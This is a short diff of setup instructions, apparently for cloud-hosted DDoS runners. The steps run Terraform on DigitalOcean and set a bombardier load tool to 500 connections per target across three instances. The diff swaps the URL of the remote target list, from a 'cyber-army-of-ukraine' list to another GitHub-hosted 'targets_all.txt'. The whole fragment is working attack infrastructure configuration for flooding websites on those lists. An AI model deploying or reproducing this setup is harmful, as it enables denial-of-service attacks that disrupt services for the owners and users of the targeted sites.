@@ -22,7 +22,7 @@ cd keys
 /bin/sh gen_ssh_keys.sh
 cd ../terraform/digital_ocean
 terraform init
-echo -e 'runner_resources_url = "https://raw.githubusercontent.com/cyber-army-of-ukraine/toxic-resources/master/resources.txt"
+echo -e 'runner_resources_url = "https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt"
 runner_bombardier_connections_per_resource = 500
 instance_count = 3
 instance_region = "fra1"
